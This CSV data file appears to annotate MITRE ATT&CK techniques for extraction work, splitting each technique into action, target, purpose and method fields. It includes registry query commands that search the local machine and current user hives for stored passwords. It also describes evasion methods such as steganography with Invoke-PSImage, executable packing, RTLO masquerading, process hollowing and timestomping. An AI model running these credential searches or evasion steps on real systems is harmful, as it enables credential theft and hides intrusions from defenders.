0,0,1,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,,,217,credential access ,exploitation for credential access,t1212,exploitation,credential access,,,,,privilege escalation depending on the process targeted or credentials obtained,,,,,,,,,
,1,,143,credential access ,credential in registry,t1214,query/find,registry/registry keys,related to password information,,,,<what> looking/search <\what> for <where> credentials <\where> and <\where> passwords <\where> that have been stored; automatic logons,looking/search/use,credentials,local machine hive: <where> reg query hklm /f password /t reg_sz /s <\where>current user hive:  <where> reg query hkcu /f password /t reg_sz /s <\where>,,"reg query hklm /f password /t reg_sz /s  ,  reg query hkcu /f password /t reg_sz /s",,,,
,1,,393,"credential access ,discovery",network sniffing,t1040,place,network interface,promiscuous mode,,,,passively <what>access<\what> <where>data<\where> in transit over the network,access,data,,,,,,,
,,,394,"credential access ,discovery",network sniffing,t1040,use,"span port,techniques for name service resolution poisoning , llmnr/nbt-ns poisoning and relay",,,,,<what>capture<\what> a larger amount of <where>data<\where>;<what>capture<\what> <where>credentials<\where>,capture,"data,credentials",,,,,,,
1,,,556,defense evasion,rootkit,t1014,use,rootkit,,,,"hypervisor , master boot record , system firmware or others","<what>hide<\what> the presence of <where>programs<\where>, <where>files<\where>, <where>network connections<\where>, <where>services<\where>, <where>drivers<\where>, and other system components",hide,"programs , files , network connections , services , drivers","<what>intercepting<\what> (i.e., <what>hooking<\what>) and <what>modifying<\what> <where>operating system api calls<\where>",,,,,,
,,,557,defense evasion,rootkit,t1014,intercept,hooking,,,,,,,,,,,,,,
,,,558,defense evasion,rootkit,t1014,modify,operating system API,,,,,,,,,,,,,,
,,,406,defense evasion,obfuscated files or information,t1027,encrypt/obfuscate/encode/,file/executable,,,,,difficult to <what>discover<\what> or <what>analyze<\what>,"discover , analyze",,,,,,,,
,,,407,defense evasion,obfuscated files or information,t1027,compress,payload,,"<condition><object>user's action<\object> may be required<\condition> to open and deobfuscate/decode files or information for user execution , user may also be <condition>required to input a <object>password<\object><\condition> to open a password protect","<object>user's action<\object> may be required , required to input a <object>password<\object>","user's action , password",avoid detection,,,,,,,,,
,,,408,defense evasion,obfuscated files or information,t1027,archive,payload,,"<condition><object>user's action<\object> may be required<\condition> to open and deobfuscate/decode files or information for user execution , user may also be <condition>required to input a <object>password<\object><\condition> to open a password protect","<object>user's action<\object> may be required , required to input a <object>password<\object>","user's action , password",avoid detection,,,,,,,,,
,,,409,defense evasion,obfuscated files or information,t1027,encrypt,payload,,"<condition><object>user's action<\object> may be required<\condition> to open and deobfuscate/decode files or information for user execution , user may also be <condition>required to input a <object>password<\object><\condition> to open a password protect","<object>user's action<\object> may be required , required to input a <object>password<\object>","user's action , password",avoid detection,,,,,,,,,
,,,410,defense evasion,obfuscated files or information,t1027,use, script,compressed/archived,"<condition><object>user's action<\object> may be required<\condition> to open and deobfuscate/decode files or information for user execution , user may also be <condition>required to input a <object>password<\object><\condition> to open a password protect","<object>user's action<\object> may be required , required to input a <object>password<\object>","user's action , password",avoid detection,,,,,,,,,
,,,411,defense evasion,obfuscated files or information,t1027,use,javascript,,,,,avoid detection,,,,,,,,,
,,,412,defense evasion,obfuscated files or information,t1027,encode,portions of file,,,,,<what>hide<\what> the <where>plain-text strings<\where>,hide,plain-text strings,,,,,,,
,,,413,defense evasion,obfuscated files or information,t1027,split,payload,"separate, seemingly benign files",,,,,,,,,,,,,
,,,414,defense evasion,obfuscated files or information,t1027,obfuscate,command,,,,,,,,command-line interface,use,steganography,,,,
,,,415,defense evasion,obfuscated files or information,t1027,use,"environment variable , alias , character , platform/language specific semantic",,,,,<what>evade<\what> <where>signature based detections<\where> and <where>whitelisting mechanisms<\where>,evade,"signature based detections , whitelisting mechanisms",,,,,,,
,,,416,defense evasion,obfuscated files or information,t1027,use,steganography,,,,,"<what>hiding<\what> <where>messages<\where> or <where>code<\where> in <where>images<\where>, <where>audio tracks<\where>, <where>video clips<\where>, or <where>text files<\where>. ",hide  ,"messages, code, images, audio tracks, video clips, text files",,,,,,,
,,,417,defense evasion,obfuscated files or information,t1027,"encrypt , hide , exfiltrate","information , information  , image","images , image , c2 server",,,,,,,<what>use<\what> of <where>steganography<\where>,,,,,,
,,,418,defense evasion,obfuscated files or information,t1027,use,invoke-psimage,,,,,"<what>hide<\what> <where>powershell commands<\where> in an image file (png)  , <what>execute<\what> the <where>code<\where> on a victim's system","hide , execute","powershell commands , code",,,,,,,
,,,419,defense evasion,obfuscated files or information,t1027,"download , communicate","script  , information","obfuscated,",,,,gather intelligence from the victim's machine,,,,,,,,,
,,,345,defense evasion,masquerading,t1036,manipulate,"name of an executable  ,  location of an executable ",,,,,evading defenses,,,,,,,,,
,,,346,defense evasion,masquerading,t1036,place executable,trusted directory,commonly ,,,,,,,,,,,,,
,,,347,defense evasion,masquerading,t1036,"move , rename","common system utility , program",,,,,"<what>bypass<\what> <where>tools<\where> that trust executables by relying on file name or path , <what>deceive<\what> <where>defenders<\where> and <where>system administrators<\where> into thinking a file is benign by associating the name with something ","bypass , deceive","tools , defenders , system administrators",,,,,,,
,,,348,defense evasion,masquerading,t1036,bypass,tool,,,,,,,,,,,,,,
,,,349,defense evasion,masquerading,t1036,use,right-to-left override (rtlo or rlo) character (u+202e) ,,,,,means of <what>tricking<\what> a <where>user<\where> into executing what they think is a benign file type but is actually executable code,tricking,user,,,,,,,
,,,350,defense evasion,masquerading,t1036,rename, utility,legitimate,,,,avoid detections,,,,,,,,,
,,,351,defense evasion,masquerading,t1036,move  utility,directory,different ,,,,avoid detections,,,,modifying,binary,,,,
,,,352,defense evasion,masquerading,t1036,rename, utility,legitimate,,,,avoid detections,,,,,,,,,
,,,353,defense evasion,masquerading,t1036,change,name of  process,trusted or benign process,,,,avoid detections,,,,,,,,,
,,,636,defense evasion,software packing,t1045,compress,executable,,,,,,,,software packing,,,,,,
,,,637,defense evasion,software packing,t1045,encrypt,executable,,,,,,,,software packing,,,,,,
,,,638,defense evasion,software packing,t1045,pack,executable,,,,,avoid signature-based detection,,,,,,,,,
,,,639,defense evasion,software packing,t1045,use,utility ,,,,,perform software packing,,,,"intercepting , hooking , modifying",operating system api calls,,,,
,,,640,defense evasion,software packing,t1045,use,mpress,,,,,,,,,,,,,,
,,,641,defense evasion,software packing,t1045,use, upx,,,,,,,,,,,,,,
,,,482,defense evasion,process hollowing,t1093,"create , unmapp , replace","process , memory, memory","suspended state , ,malicious code",,,,"<what>evade<\what> <where>defenses and detection analysis<\where>;<why-1> <what> decrypt <\what> an <where> attachment <\where>, such as a <attribute> zip file password <\attribute> <\why-1>, in order to <why-2> <what> evade <\what> <attribute> email boundary <\attribute> <where> defenses <\where> <why-2>",evade,defenses and detection analysis,,,,,,,
,,,401,defense evasion,ntfs file attributes,t1096,store,data,,,,,"<what>evade<\what> some <where>defenses<\where>, such as <where>static indicator scanning tools<\where> and <where>anti-virus<\where>",evade,"defenses , static indicator scanning tools , anti-virus",,,,,,,
,,,402,defense evasion,ntfs file attributes,t1096,store,binary,file attribute metadata,,,,"<what>evade<\what> some <where>defenses<\where>, such as <where>static indicator scanning tools<\where> and <where>anti-virus<\where>",evade,"defenses , static indicator scanning tools , anti-virus",,,,,,,
,,,403,defense evasion,ntfs file attributes,t1096,evade/bypass,defense,,,,,,,,,,,,,,
,,,404,defense evasion,ntfs file attributes,t1096,evade/bypass,static indicator scanning tool,,,,,,,,,,,,,,
,,,405,defense evasion,ntfs file attributes,t1096,evade/bypass, anti-virus,,,,,,,,,,,,,,
,,,722,defense evasion,timestomp,t1099,modify,timestamps of a file ,"the modify, access, create, and change times",,,,"<what>mimic<\what> <where>files<\where> that are in the same folder , they <what>do not appear conspicuous<\what> to <where>forensic investigators<\where> or <where>file analysis tools<\where>","mimic , do not appear conspicuous","files , forensic investigators , file analysis tools",,,,,,,
